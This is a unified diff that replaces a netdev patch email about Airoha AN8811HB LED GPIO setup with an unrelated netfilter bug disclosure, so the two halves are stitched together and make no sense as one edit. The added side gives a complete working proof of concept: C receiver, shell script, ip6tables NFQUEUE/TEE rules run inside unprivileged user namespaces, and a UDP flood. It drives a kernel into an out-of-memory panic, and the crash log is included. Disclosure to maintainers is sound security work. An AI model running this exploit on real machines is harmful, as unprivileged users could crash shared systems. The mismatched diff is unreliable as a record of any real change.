@@ -1,77 +1,80 @@
-Received: from mail-pj1-f44.google.com (mail-pj1-f44.google.com [209.85.216.44])
+Received: from mail-pj1-f53.google.com (mail-pj1-f53.google.com [209.85.216.53])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 569FF33F5A9
-	for <netdev@vger.kernel.org>; Sat, 29 Aug 2026 03:41:24 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.44
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D2B16332604
+	for <netdev@vger.kernel.org>; Sat, 29 Aug 2026 05:19:17 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.53
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1787974885; cv=none; b=oFB4S3U8wY0wwcTDlbmYK1ZyHev1GbH41CKsoYbhhwY49/rnMBJkYqb+2yKZrhu94AZ8eUTf2KhutXfqFvmX1gCjCaGdfB1tI7zHYr26wOdgPO/oqUzq1AgWp1VDYVjQxB7lxxfIXofvSMuYWd3pheQlOS2WaKuR3Hh1lSf+jYg=
+	t=1787980759; cv=none; b=TnBX/U8fyX37NjQMGyXdtV1SiyhCMpnYtgIfEQL2ey6JE8O9oefWWCVKWRdL5Sk7zZd7fWo5WYPD/rfCpch4G31NxAyylcareezH26TeFjBh62iXMmkkWrh7JcXs+sGjdhkUi7ioPxlOPDRxcQunRkkHAcwO97c95KjVign15+w=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1787974885; c=relaxed/simple;
-	bh=Oyzr0NbbRntUhfVfyint/OMfL9PMoXNLK9GrLWCD/II=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=rYekt90u1nhZ5xVXHchfRqwXnhPfBza+NF/QG1GSspWcQCgPHcr94cV3Ebxgq9banpG4Xd4ZzwA7BsLMsYuw4bLEkwrU/KV3cGFHbxfgsndOHgKyIYUULXsulfVZXJMIfChjg7dxs17wwdBtzgq8ZuEQXaoyQnaFqxzJyphdpkA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=cRF3X1Kc; arc=none smtp.client-ip=209.85.216.44
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1787980759; c=relaxed/simple;
+	bh=LjAaMPDOro3SAjWT5NojqacgBdYWrv2RwNuC5XVfSTs=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UrG078oj1GI/iIpFtpAO8yuEX8oNfY9ZoKKPVIei6n4Divuo7SanRQY1x2pjZ36QRlhljdThoEQgQsmjWGQl4yVxnvIzw5oNpiCSvpTRgm7tGOZysRaVcruKAmkGWqfhn4B5c0TSe46JhQ0dZU5C4iHxtaKsN9oWYErJM4eWCek=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=QFCC7d9H; arc=none smtp.client-ip=209.85.216.53
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="cRF3X1Kc"
-Received: by mail-pj1-f44.google.com with SMTP id 98e67ed59e1d1-3968e063f84so1290820a91.0
-        for <netdev@vger.kernel.org>; Fri, 28 Aug 2026 20:41:23 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="QFCC7d9H"
+Received: by mail-pj1-f53.google.com with SMTP id 98e67ed59e1d1-381b831d535so3008654a91.0
+        for <netdev@vger.kernel.org>; Fri, 28 Aug 2026 22:19:17 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1787974883; x=1788579683; darn=vger.kernel.org;
+        d=nebusec.ai; s=google; t=1787980757; x=1788585557; darn=vger.kernel.org;
         h=content-transfer-encoding:mime-version:message-id:date:subject:cc
          :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=UhmCGz4O2Sg0rYh2f0GjlwZofbGMWZdgyMVeCKxxLm0=;
-        b=cRF3X1KcAFlhu+9utsa4YBJ9gyzsEoLS7exUkC//8oUGA95LjbWzQFV6UOGFb2O+u7
-         5SrcaFloiVundhC8r8mCIVbd4MuHvUXAh2VWkN+T9H5wdxmFYMvUyArQB+MjBpda0fib
-         9HirL9mUxxEdoAQS7CbVSpNXnYDt1IJC+Ux6Y+DhTA4S6DRhfcVRfYj0i+QYJxws8ZY3
-         2mZ9EkiG1eNRgjLBG25ghJtKEofw3cvs3+fDVg8aWCLvReesUxreUncDNCD2sWs20WC3
-         Vuyyr0gw0JmTvkHxhHKX00XKWv7e5YAPGY+l1o0Kam0N3b7hhL3ebUz9ysE5t5k+ebC2
-         /pGA==
+        bh=n8Rgaad8Uc+ON6FjsUCmx2OBDPd9ZDG5g1xK9ARAetQ=;
+        b=QFCC7d9H/OMXGkFLKHF9TZfkp6GIuyOeE9aNKbfIlNDxw5iZ2ema8tuuw2CCskrs6Z
+         c7oJoNKhCL6FChBIyOOJLu6GZwk4V9Jw20LfTq0vy0uX3j7MBqd++tp+1pvbOdq/MCmt
+         HkKiFSJQorYTBUAEpmTcdrDXFvOqDvgCD5K1Gg5usmx2dRfFzJ28QTD9vPUbJP5OR/yN
+         1SOg8DpRLolzW2oihDQIFJwergy8XWhRdZneWENSWOLM6ptIQuHu2TyaKN67elRS2OkD
+         9Htky1wUEmXhctXkAVi8C7e4RlzgH6yWSWbBnaQXR4vA5S4UFJcAkmE470GUbVAL/frh
+         WNsw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1787974883; x=1788579683;
+        d=1e100.net; s=20251104; t=1787980757; x=1788585557;
         h=content-transfer-encoding:mime-version:message-id:date:subject:cc
          :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=UhmCGz4O2Sg0rYh2f0GjlwZofbGMWZdgyMVeCKxxLm0=;
-        b=mcjI/kuOG1FoYhFSwCWT6e8UcJ8W3GfKisHfwFrtPeuI49IwGU+4kIlGgNOjebMoiH
-         /7AO/pymmaXKp0eeITXEheH/gLP8p2IrttAtK+hJE9VdnBRxdGosX0oPVYnAHATBepKY
-         KgujPUy57Z1q31jdS4ZWnFE5VTOFUGP7FN12rTB/X5pyGyCw4iaUCU1O/ampfK+9gKTN
-         xgn//p7I80wsdEMWqbl5yWTElO5z6jdPXrh7VBRGxTiOG3V9ikgK+2hwyDOtc4L6tUYH
-         cJhyEGTxMAOZiP6oo1KWdbAPdypToM82OvYcr0SVIIl3M92e/LIyVBfyQ8pelpXa4BXZ
-         wGxg==
-X-Gm-Message-State: AFuF++nd99tN+xDj+FiCOGpl9kXyB7O+cQ0UZZDMyDAKCr2HN/56WLT6
-	i+GnJIPgN1+oegvqCDjeG8tbjSQCjeK9VtfjtG8k1i3nrm8OnJGVD1Kzc9JVpaKSx8w=
-X-Gm-Gg: AYBFou3DY/SRp/X1Cpnj+d8KAwoP1n7Tj0paRSRJAfpdplblfKMF9gYcNchUT2KTIGc
-	qUffgFlOWrr89nuhiTG6laMw0pd3dF8C4wtmFdHEJ0Aoe45i8Fqampan2dwilGoSTgK5cIVR92l
-	yO1w9Q7pflbhPzu1ynhXvX6ekTcIbkug0G0o+1d21TI46paPThmbhCuc+NFIE4/rHEgQDAx95mj
-	41+dkLzpTgvQo1NQVLX0yWlltueg6h4uuAGWOBKopOyiMkvBD4O10JizgB9AjdhUyPe1nDw3vW0
-	LsXgLDZsQEzj0ktvpDCzicI30uklAbtxrdP84Clj4lw+J9S045s/CRINKSM/zKIwAKMcolfWzpZ
-	PDug6nu0RXuwA34BQG1OyiffHG1bhH5ZaWB4/lKCCS9tk5UzIcZUvfmbl6NPl9FZ/pArmNcvLXR
-	2jD13LjoN/62PPjUTbXvxbrwVJ/PpqQ5QCxTbZ1ulWxHROPzYYuiqNAbJb5I6gxm7J
-X-Received: by 2002:a17:90a:d2c7:b0:398:9bd1:3210 with SMTP id 98e67ed59e1d1-3989bd135c0mr6264616a91.17.1787974883056;
-        Fri, 28 Aug 2026 20:41:23 -0700 (PDT)
-Received: from DESKTOPHOME.lan ([240e:3a3:9304:9820:9199:f1d:64d0:73a2])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-396dda36ed6sm5097134a91.2.2026.08.28.20.41.19
+        bh=n8Rgaad8Uc+ON6FjsUCmx2OBDPd9ZDG5g1xK9ARAetQ=;
+        b=VpS4sbFDWJJFu0cerE3vqnVc9BULnk0yKq6toOw6S+cZZuu0AvlbFew7aXUftvyPbN
+         CPPTwhYO1hLMHSbC4MECcwMqzI8QNxTWtR0MF0rrdUfnlqY45gfmTpKdOvXk/nTt/uYd
+         Xs9wY8+nidOlWF5zPoRQvkgh0cSxKWsJ4Vs5eYZC7q2s5KgZqleklcxwFawoDArv3coZ
+         nfDYsCTJZra8zw1uIzhUlJuiEw4PqbHoFEQ44Tu1ysAATco3a6coBdPeKIbyqWy/Luex
+         asDahjz88Q8eT3Tm2p3x3VN4uznSclUikGgkQ/UPEayei7GwaiRTaBx5hhTT72hCamQr
+         L3Wg==
+X-Forwarded-Encrypted: i=1; AKwUvByq3Lu/AcbsmReP8dIONBIJhHQmuyatFq6X/vJmI9sxqqCzvJez3wYwbV+Rk3Uir+ClqehuJDo=@vger.kernel.org
+X-Gm-Message-State: AFuF++mnCkRtVpjtPIDGoMv0krpsjxBfCjK9jayGd4OA9+Fe08ZMtumZ
+	DKng4vCSpaJQrIEqTGGsOW44/8icDe2tCHbMrZaH380xaoNVXOvCZShioGDqsyGsTKl2
+X-Gm-Gg: AYBFou1HKKo3BOVAm2DEiyZzczAhFDrV9gcHPiwPAmf7j5zWH5fkN8l1vFGjH9tV/Fc
+	HvEnKVn8QiS5AOXuNRzYQftYUemHhfLg+izLapy5fCKH4WiGhiQ592gjgCVBpxrmPKrcc2AmjS+
+	Sh8bPtI/ZZzYs2sWZU5n2CF4GHuElTnIDpFdmlq8uQM8elGzn18GWiDKgGVWvlhf4GjbmMiUCyb
+	6h2qvClV96EzMxudH+pze8WnmWdLB34GyGxkzwWSbgXeNJgHeUkLtaTs6NdrkKNvLt+opNJeFNW
+	1HeCgtwx5DPI7vqEXUle3h1MJdXTtHhH0vj3l329+MKIM6MiccVIPnXbCzcKSl8FMpcIeCeJIFV
+	NEBNcO9U7xi7ZueBlXM8EWPOqZK27f3sld1Z9oggq3WffIhZ7E0S6Rw+jMDWOQZQIU/FoYUCzzE
+	ck4ACN1okcr15ePY2VzMBRRErK8SwEHbVxedi1JsXhDMf2igAM/5YvghM7He03pGY5zxVf91Ufz
+	GDeg96sxBZSh0g=
+X-Received: by 2002:a17:90b:5102:b0:38e:70d5:b12d with SMTP id 98e67ed59e1d1-396d0ea862fmr22395949a91.6.1787980757021;
+        Fri, 28 Aug 2026 22:19:17 -0700 (PDT)
+Received: from gmail.com ([202.201.12.230])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-396dda7c922sm5569572a91.7.2026.08.28.22.19.11
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Fri, 28 Aug 2026 20:41:22 -0700 (PDT)
-From: Ziyou Xu <xuziyougm@gmail.com>
-To: netdev@vger.kernel.org
-Cc: andrew@lunn.ch,
-	hkallweit1@gmail.com,
-	linux@armlinux.org.uk,
-	davem@davemloft.net,
-	edumazet@google.com,
-	kuba@kernel.org,
-	pabeni@redhat.com,
-	bjorn@mork.no,
-	ericwouds@gmail.com,
+        Fri, 28 Aug 2026 22:19:16 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: Pablo Neira Ayuso <pablo@netfilter.org>,
+	Florian Westphal <fw@strlen.de>,
+	"David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>
+Cc: Phil Sutter <phil@nwl.cc>,
+	Simon Horman <horms@kernel.org>,
+	netfilter-devel@vger.kernel.org,
+	netdev@vger.kernel.org,
 	linux-kernel@vger.kernel.org,
-	stable@vger.kernel.org
-Subject: [PATCH net v3] net: phy: air_en8811h: restore AN8811HB LED GPIO after MCU restart
-Date: Sat, 29 Aug 2026 11:38:43 +0800
-Message-ID: <20260829033844.1975-1-xuziyougm@gmail.com>
-X-Mailer: git-send-email 2.43.0
+	coreteam@netfilter.org,
+	Zihan Xi <zihanx@nebusec.ai>
+Subject: [PATCH nf 0/1] netfilter: nf_dup: prevent asynchronous duplicate recursion
+Date: Sat, 29 Aug 2026 05:19:02 +0000
+Message-ID: <cover.1787903722.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -80,77 +83,396 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Commit 03b4702fc5e3 ("net: phy: air_en8811h: move LED GPIO
-configuration to config_init") moved the EN8811H LED GPIO setup from
-probe to config_init because an MD32 restart clears the output-enable
-bits.
+Hi Linux kernel maintainers,
 
-AN8811HB follows the same initialization sequence: an8811hb_probe()
-enables GPIO3/4/5, and later config_init() calls restart MD32.
+We found and validated a issue in net/ipv6/netfilter/nf_dup_ipv6.c. The bug is
+reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-Move the AN8811HB GPIO setup to the end of an8811hb_config_init(),
-matching the current EN8811H path.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Fixes: 5afda1d734ed ("net: phy: air_en8811h: add Airoha AN8811HB support")
-Suggested-by: Jakub Kicinski <kuba@kernel.org>
-Cc: stable@vger.kernel.org
-Signed-off-by: Ziyou Xu <xuziyougm@gmail.com>
----
-Changes in v3:
-- Return the GPIO register update result directly, as suggested by
-  Andrew Lunn.
+---- details below ----
 
-Changes in v2:
-- Drop the EN8811H change, merged independently as commit 03b4702fc5e3
-  ("net: phy: air_en8811h: move LED GPIO configuration to config_init").
-- Apply the same fix to AN8811HB per Jakub's review.
-- Rebase onto netdev/main.
+Bug details:
 
-Not tested on AN8811HB hardware.
+nf_dup_ipv4() and nf_dup_ipv6() prevent recursive TEE targets and nftables
+dup expressions only with current->in_nf_duplicate. The flag covers the
+synchronous ip_local_out() or ip6_local_out() call, but it is cleared when
+the output function returns.
 
-v2: https://lore.kernel.org/netdev/20260828032922.469449-1-xuziyougm@gmail.com/
-v1: https://lore.kernel.org/netdev/20260820141034.1400439-1-xuziyougm@gmail.com/
+An earlier NFQUEUE hook can retain the cloned skb while letting the output
+function return. A later NF_ACCEPT verdict resumes the same skb at the hook
+after the queueing rule, under the verdict task and after the task flag was
+cleared. A later TEE target or dup expression can therefore clone it again.
+An earlier queue hook and a later duplication hook form an unbounded packet
+generation loop. The same root cause is reachable through IPv4, IPv6,
+xtables, nftables, and mixed frontend rule sets.
 
----
- drivers/net/phy/air_en8811h.c | 15 +++++++--------
- 1 file changed, 7 insertions(+), 8 deletions(-)
+The patch records the duplication state in the cloned skb and rejects a
+second duplication when either the task or skb guard is set. Normal skb
+header copies retain the bit, while nf_copy() propagates it to IPv4 and IPv6
+fragments. The task flag remains in place for synchronous recursion and the
+alternate xtables jumpstack.
 
-diff --git a/drivers/net/phy/air_en8811h.c b/drivers/net/phy/air_en8811h.c
-index 0eeb7b9a4..38eb18f0e 100644
---- a/drivers/net/phy/air_en8811h.c
-+++ b/drivers/net/phy/air_en8811h.c
-@@ -1125,13 +1125,6 @@ static int an8811hb_probe(struct phy_device *phydev)
- 	if (ret)
- 		goto err_dev_create;
- 
--	/* Configure led gpio pins as output */
--	ret = air_phy_buckpbus_reg_modify(phydev, AN8811HB_GPIO_OUTPUT,
--					  AN8811HB_GPIO_OUTPUT_345,
--					  AN8811HB_GPIO_OUTPUT_345);
--	if (ret < 0)
--		goto err_dev_create;
--
- 	return 0;
- 
- err_dev_create:
-@@ -1265,9 +1258,15 @@ static int an8811hb_config_init(struct phy_device *phydev)
- 
- 	ret = air_leds_init(phydev, EN8811H_LED_COUNT, AIR_PHY_LED_DUR,
- 			    AIR_LED_MODE_USER_DEFINE);
--	if (ret < 0)
-+	if (ret < 0) {
- 		phydev_err(phydev, "Failed to initialize leds: %d\n", ret);
-+		return ret;
-+	}
- 
-+	/* Restore LED GPIO output enables after MCU initialization. */
-+	ret = air_phy_buckpbus_reg_modify(phydev, AN8811HB_GPIO_OUTPUT,
-+					  AN8811HB_GPIO_OUTPUT_345,
-+					  AN8811HB_GPIO_OUTPUT_345);
- 	return ret;
- }
- 
+The root cause predates the later helper extraction and nftables caller.
+Commit cd58bcd9787e ("netfilter: xt_TEE: have cloned packet travel through
+Xtables too") changed TEE clones from direct ip_output()/ip6_output() to
+ip_local_out()/ip6_local_out() and introduced a transient tee_active guard.
+Its parent bypassed clone traversal through Xtables, so the current
+queue-after-guard-lifetime state did not exist there. Commit bbde9fc1824a
+factored the logic into nf_dup_ipv4()/nf_dup_ipv6(), commit d877f07112f1
+added nftables dup callers, and commit a1f1acb9c5db moved the same transient
+guard into task_struct. Those later commits preserved or widened the older
+root cause, so the Fixes tag points to cd58bcd9787e.
 
-base-commit: 1b78070aaef63512688aebfbc82365ef9d6660f1
+The crash log below was produced by the unpatched baseline during a root run
+of this reproducer. It was decoded with decode_stacktrace.sh using the
+matching vmlinux, so source file and line information is included.
+
+Reproducer:
+
+    make
+    PANIC_ON_OOM=0 QUEUE_COUNT=1 TEE_CLONES=1 PAYLOAD=1 \
+        bash ./poc.sh --userns
+
+The complete multi-file reproducer uses libnetfilter_queue. The Makefile
+links the receiver with -lnetfilter_queue -lnfnetlink; poc.sh installs the
+NFQUEUE and TEE rules and sends the IPv6 UDP traffic. The two-line template
+shorthand below is receiver-only reference, not the complete trigger. It
+does not install rules or send traffic, and the standalone receiver also
+requires the two libraries above:
+
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
+
+The crash run used:
+
+    PANIC_ON_OOM=1 bash ./poc.sh
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+This describes both the controlled comparison and the crash run. The crash
+log reports CPU: 1, consistent with the 2-vCPU guest.
+
+packetdrill was not used because the trigger requires a userspace
+libnetfilter_queue verdict service together with ip6tables NFQUEUE/TEE rule
+installation, which packetdrill cannot express by itself.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/netfilter.h>
+#include <linux/netlink.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <time.h>
+#include <unistd.h>
+
+#include <libnetfilter_queue/libnetfilter_queue.h>
+
+static volatile sig_atomic_t stop;
+static uint64_t packets_seen;
+static uint64_t last_report;
+static struct timespec start_ts;
+
+static void on_signal(int signo)
+{
+	(void)signo;
+	stop = 1;
+}
+
+static void report_progress(bool force)
+{
+	struct timespec now;
+	double seconds;
+
+	if (!force && packets_seen - last_report < 1000)
+		return;
+
+	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
+		return;
+
+	seconds = (now.tv_sec - start_ts.tv_sec) +
+		  (now.tv_nsec - start_ts.tv_nsec) / 1000000000.0;
+	fprintf(stderr, "accepted=%llu elapsed=%.3f rate=%.0f pkt/s\n",
+		(unsigned long long)packets_seen, seconds,
+		seconds > 0.0 ? packets_seen / seconds : 0.0);
+	last_report = packets_seen;
+}
+
+static int queue_cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
+		    struct nfq_data *nfa, void *data)
+{
+	struct nfqnl_msg_packet_hdr *ph;
+	uint32_t id = 0;
+
+	(void)nfmsg;
+	(void)data;
+
+	ph = nfq_get_msg_packet_hdr(nfa);
+	if (ph)
+		id = ntohl(ph->packet_id);
+
+	packets_seen++;
+	report_progress(false);
+
+	return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+}
+
+int main(int argc, char **argv)
+{
+	struct nfq_handle *h = NULL;
+	struct nfq_q_handle *qh = NULL;
+	int fd;
+	int queue_num = 0;
+	int rv;
+	int ret = 1;
+	int one = 1;
+	int rcvbuf = 512 * 1024 * 1024;
+	unsigned int maxlen = 65535;
+	char buf[8192] __attribute__((aligned));
+
+	if (argc > 2) {
+		fprintf(stderr, "usage: %s [queue-num]\n", argv[0]);
+		return 2;
+	}
+	if (argc == 2)
+		queue_num = atoi(argv[1]);
+
+	signal(SIGINT, on_signal);
+	signal(SIGTERM, on_signal);
+
+	if (clock_gettime(CLOCK_MONOTONIC, &start_ts) != 0) {
+		perror("clock_gettime");
+		return 1;
+	}
+
+	h = nfq_open();
+	if (!h) {
+		perror("nfq_open");
+		goto out;
+	}
+
+	if (nfq_unbind_pf(h, AF_INET6) < 0)
+		fprintf(stderr, "warning: nfq_unbind_pf(AF_INET6) failed\n");
+
+	if (nfq_bind_pf(h, AF_INET6) < 0) {
+		perror("nfq_bind_pf(AF_INET6)");
+		goto out;
+	}
+
+	qh = nfq_create_queue(h, (uint16_t)queue_num, queue_cb, NULL);
+	if (!qh) {
+		perror("nfq_create_queue");
+		goto out;
+	}
+
+	if (nfq_set_mode(qh, NFQNL_COPY_META, 0) < 0) {
+		perror("nfq_set_mode");
+		goto out;
+	}
+
+	if (nfq_set_queue_maxlen(qh, maxlen) < 0)
+		fprintf(stderr, "warning: nfq_set_queue_maxlen(%u) failed\n", maxlen);
+
+	fd = nfq_fd(h);
+	if (setsockopt(fd, SOL_SOCKET, SO_RCVBUFFORCE, &rcvbuf,
+		       sizeof(rcvbuf)) < 0 &&
+	    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0)
+		fprintf(stderr, "warning: socket receive buffer setup failed: %s\n",
+			strerror(errno));
+	if (setsockopt(fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &one, sizeof(one)) < 0)
+		fprintf(stderr, "warning: NETLINK_NO_ENOBUFS failed: %s\n",
+			strerror(errno));
+
+	while (!stop) {
+		rv = recv(fd, buf, sizeof(buf), 0);
+		if (rv >= 0) {
+			if (nfq_handle_packet(h, buf, rv) < 0) {
+				perror("nfq_handle_packet");
+				break;
+			}
+			continue;
+		}
+
+		if (errno == EINTR)
+			continue;
+		if (errno == ENOBUFS)
+			continue;
+
+		perror("recv");
+		break;
+	}
+
+	report_progress(true);
+	ret = 0;
+
+out:
+	if (qh)
+		nfq_destroy_queue(qh);
+	if (h)
+		nfq_close(h);
+	return ret;
+}
+------END poc.c--------
+
+------BEGIN Makefile------
+CC ?= gcc
+CFLAGS ?= -O2 -Wall -Wextra
+LDLIBS ?= -lnetfilter_queue -lnfnetlink
+
+all: poc
+
+poc: poc.c
+
+clean:
+	rm -f poc
+------END Makefile--------
+
+------BEGIN poc.sh------
+#!/bin/bash
+set -euo pipefail
+
+SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
+IP=/usr/sbin/ip
+IP6TABLES=/usr/sbin/ip6tables-legacy
+SYSCTL=/usr/sbin/sysctl
+export XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-$SCRIPT_DIR/xtables.lock}
+QUEUE_COUNT=${QUEUE_COUNT:-18}
+BASE_PORT=${BASE_PORT:-5555}
+PAYLOAD=${PAYLOAD:-60000}
+TEE_CLONES=${TEE_CLONES:-2}
+PANIC_ON_OOM=${PANIC_ON_OOM:-1}
+PANIC_ON_WARN=${PANIC_ON_WARN:-0}
+
+if [[ ${1-} == "--userns" ]]; then
+	exec unshare -Urn -- "$0" --inside-userns
+fi
+
+if [[ ${1-} == "--inside-userns" ]]; then
+	shift
+fi
+
+cleanup() {
+	"$IP6TABLES" -t raw -F OUTPUT 2>/dev/null || true
+	"$IP6TABLES" -t mangle -F OUTPUT 2>/dev/null || true
+	for pid in "${acceptor_pids[@]-}"; do
+		kill "$pid" 2>/dev/null || true
+	done
+	for pid in "${acceptor_pids[@]-}"; do
+		wait "$pid" 2>/dev/null || true
+	done
+}
+trap cleanup EXIT
+
+"$IP" link set lo up
+"$SYSCTL" -q -w kernel.panic_on_warn="$PANIC_ON_WARN" || true
+"$SYSCTL" -q -w vm.panic_on_oom="$PANIC_ON_OOM" || true
+"$SYSCTL" -q -w net.core.rmem_max=536870912 || true
+"$SYSCTL" -q -w net.core.rmem_default=536870912 || true
+"$SYSCTL" -q -w net.netfilter.nf_queue_maxlen=65535 || true
+
+make -C "$SCRIPT_DIR" clean all
+
+"$IP6TABLES" -t raw -F OUTPUT
+"$IP6TABLES" -t mangle -F OUTPUT
+
+acceptor_pids=()
+
+for q in $(seq 0 $((QUEUE_COUNT - 1))); do
+	port=$((BASE_PORT + q))
+
+	"$IP6TABLES" -t raw -A OUTPUT \
+		-p udp -d ::1 --dport "$port" \
+		-j NFQUEUE --queue-num "$q"
+
+	for _ in $(seq 1 "$TEE_CLONES"); do
+		"$IP6TABLES" -t mangle -A OUTPUT \
+			-p udp -d ::1 --dport "$port" \
+			-j TEE --gateway ::1 --oif lo
+	done
+
+	"$SCRIPT_DIR/poc" "$q" >"$SCRIPT_DIR/acceptor-$q.log" 2>&1 &
+	acceptor_pids+=("$!")
+done
+sleep 1
+
+python3 - "$BASE_PORT" "$QUEUE_COUNT" "$PAYLOAD" <<'PY'
+import socket
+import sys
+
+base_port = int(sys.argv[1])
+queue_count = int(sys.argv[2])
+payload_len = int(sys.argv[3])
+
+s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+for offset in range(queue_count):
+	dport = base_port + offset
+	s.sendto(b"A" * payload_len, ("::1", dport))
+	print("sent", payload_len, "bytes to ::1", dport)
+PY
+
+echo "PoC is active. Queue state:"
+cat /proc/net/netfilter/nfnetlink_queue 2>/dev/null || true
+
+wait
+------END poc.sh--------
+
+----BEGIN crash log----
+[   41.727564] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
+[   41.749001] CPU: 1 UID: 0 PID: 91 Comm: systemd-journal Not tainted 7.2.0-07242-g7cbfb180945c #1 PREEMPT(lazy) 
+[   41.774942] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   41.804442] Call Trace:
+[   41.810996]  <TASK>
+[   41.817782]  vpanic (kernel/panic.c:651)
+[   41.827657]  panic (kernel/panic.c:788)
+[   41.837426]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oom_kill.c:1143 (discriminator 4))
+[   41.849070]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4116 mm/page_alloc.c:4967 mm/page_alloc.c:5317)
+[   41.864629]  ? blk_finish_plug (block/blk-core.c:1293)
+[   41.878318]  alloc_pages_mpol (mm/mempolicy.c:2490)
+[   41.893205]  folio_alloc_noprof (mm/mempolicy.c:2561 (discriminator 1) mm/mempolicy.c:2581 (discriminator 1) mm/mempolicy.c:2591 (discriminator 1))
+[   41.907427]  __filemap_get_folio_mpol (mm/filemap.c:2018 (discriminator 2))
+[   41.925721]  filemap_fault (include/linux/pagemap.h:761 mm/filemap.c:3598)
+[   41.938653]  __do_fault (mm/memory.c:5425)
+[   41.950917]  __handle_mm_fault (mm/memory.c:5860 mm/memory.c:5994 mm/memory.c:4566 mm/memory.c:6379 mm/memory.c:6517)
+[   41.966132]  handle_mm_fault (mm/memory.c:6686)
+[   41.980871]  do_user_addr_fault (arch/x86/mm/fault.c:1343)
+[   41.993516]  exc_page_fault (arch/x86/mm/fault.c:1483 arch/x86/mm/fault.c:1536)
+[   42.007098]  asm_exc_page_fault (arch/x86/include/asm/idtentry.h:595)
+[   42.020389] RIP: 0033:0x7f85625ebff9
+[   42.034319] Code: Unable to access opcode bytes at 0x7f85625ebfcf.
+
+Code starting with the faulting instruction
+===========================================
+[   42.054294] RSP: 002b:00007ffc20d6b660 EFLAGS: 00010202
+[   42.072734] RAX: 0000000000000001 RBX: 000055b7f426f600 RCX: 00007f8562328df6
+[   42.090030] RDX: 0000000000000013 RSI: 000055b7f4277030 RDI: 0000000000000000
+[   42.108167] RBP: ffffffffffffffff R08: 0000000000000000 R09: 00007f85626c8000
+[   42.131161] R10: 00000000ffffffff R11: 0000000000000000 R12: 0000000000000001
+[   42.153849] R13: 0000000000000013 R14: 0000000000000000 R15: 0000000000000000
+[   42.180119]  </TASK>
+[   42.188961] Kernel Offset: 0x24000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[   42.228760] ---[ end Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled ]---
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
